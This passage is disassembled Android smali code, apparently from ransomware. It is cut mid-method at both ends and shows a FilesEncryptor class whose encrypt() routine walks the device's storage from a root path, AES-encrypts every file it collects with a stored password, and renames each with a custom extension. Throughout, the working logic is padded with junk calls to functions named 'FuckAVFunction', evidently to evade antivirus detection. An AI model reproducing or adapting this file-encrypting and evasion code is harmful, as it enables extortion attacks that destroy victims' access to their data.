    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0xb80f711

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x26561f

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 344
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x1b3d5c51

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "jhICSCShUQM"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "EpQEMSd"

    const-string v5, "HsFTFmac"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 346
    :cond_3
    return-void
.end method

.method public encrypt()V
    .locals 12

    .prologue
    const/4 v11, 0x0

    const/4 v10, 0x1

    .line 228
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "VukJBkN"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 229
    const-string v0, "PskmNRu"

    const-string v1, "fCdGUIf"

    const v2, 0x715e299

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 230
    const-string v0, "jOSbOQW"

    const-string v1, "iNwTiT"

    const v2, 0x902158e

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 232
    sget-object v0, Lcom/androidl/mqmgr/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    if-eqz v0, :cond_3

    sget-object v0, Lcom/androidl/mqmgr/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_3

    .line 233
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x27a4ac56

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "DckoePLs"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0x20c229b0

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 234
    const v0, 0x1ec9db51

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x3946486d

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x33ba07ba

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 235
    new-instance v0, Ljava/io/File;

    invoke-static {}, Lcom/androidl/mqmgr/Utils;->getRootPath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {p0, v0}, Lcom/androidl/mqmgr/FilesEncryptor;->getFileNames(Ljava/io/File;)V

    .line 236
    const-string v0, "KGQbtj"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x303b80f9

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0xc32d88f

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "qNPwm"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 237
    const v0, 0x7d7992a

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x276e30fd

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "vErlGlSA"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 238
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "LiNTcJH"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "kLBRiB"

    const v5, 0x21f7d312

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 239
    const v0, 0x3965f293

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "QWUCEpdvdn"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x2b9e2207

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x148108bc

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 240
    iget-object v0, p0, Lcom/androidl/mqmgr/FilesEncryptor;->filesToEncrypt:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    .line 241
    const v0, 0x28938e17

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x36133162

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x37b37d6c

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 242
    const v0, 0x33ff69bc

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "mDiRHVmV"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x24db4988

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x3799e0fa

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 243
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "TqouVi"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 244
    const-string v0, "acBcRu"

    const-string v1, "ASdOM"

    const v2, 0x5be3b05

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 246
    const/4 v0, 0x1

    :try_start_0
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "hhOIIfh"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 247
    const-string v0, "OSKKvMMbCGj"

    const-string v1, "Hsacusae"

    const v2, 0x10ab6e10

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 248
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "gemNHFw"

    const v3, 0x2427f84

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "bUAfdQGGEv"

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 249
    new-instance v7, Lcom/androidl/mqmgr/AesCrypt;

    invoke-direct {v7}, Lcom/androidl/mqmgr/AesCrypt;-><init>()V

    .line 250
    .local v7, "aes":Lcom/androidl/mqmgr/AesCrypt;
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x26d574bb

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "SdfnhQIphf"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0x25c8c5a9

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 251
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "DBiFuskV"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 252
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x32deb4b7

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "mgugDc"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "PcFVoF"

    const-string v5, "vnCEMbvjt"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 253
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x1607411e

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "csTJwoLwTJJ"

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "FicPPVqRNHR"

    const-string v5, "lICfOfA"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 254
    sget-object v0, Lcom/androidl/mqmgr/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    invoke-virtual {v7, v0}, Lcom/androidl/mqmgr/AesCrypt;->setPassword(Ljava/lang/String;)V

    .line 255
    const-string v0, "LHDPDgN"

    const v1, 0x2dfb0559

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "LugwP"

    const-string v3, "WflQbf"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 256
    invoke-virtual {v7}, Lcom/androidl/mqmgr/AesCrypt;->init()V

    .line 257
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0xba3e3ac

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "UhbWQ"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "vOMnQAG"

    const-string v5, "HssaLTkm"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 258
    const-string v0, "MpWASIt"

    const v1, 0x240946ae

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "hbEfpt"

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 259
    const-string v0, "IOhISOhIIU"

    const v1, 0x92d63e9

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "EfGAllnhQ"

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 260
    const v0, 0x31f3827

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "LDVwF"

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x354cd2bb

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x2ceb8b07

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 261
    iget-object v0, p0, Lcom/androidl/mqmgr/FilesEncryptor;->filesToEncrypt:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :cond_0
    :goto_0
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    .line 262
    .local v8, "fileName":Ljava/lang/String;
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x2d4d54ba

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "GrlfnQSbK"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "nMCGpC"

    const-string v5, "FcTewa"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 263
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x3a7c6905

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "KKWfjdQ"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "ntWOEKU"

    const-string v5, "HqqRRJ"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 264
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "."

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lcom/androidl/mqmgr/Constants;->ENCODED_FILE_EXTENSION:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v7, v8, v0}, Lcom/androidl/mqmgr/AesCrypt;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 265
    const v0, 0x1008733b

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x2b557d91

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x215cc2c6

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 266
    const-string v0, "gPeoqNLF"

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0xb28f4bc

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x5f9cb7

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "frfWCbdth"

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 267
    const-string v0, "vrAElfAIG"

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x1586bbaf

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x3448fc9d

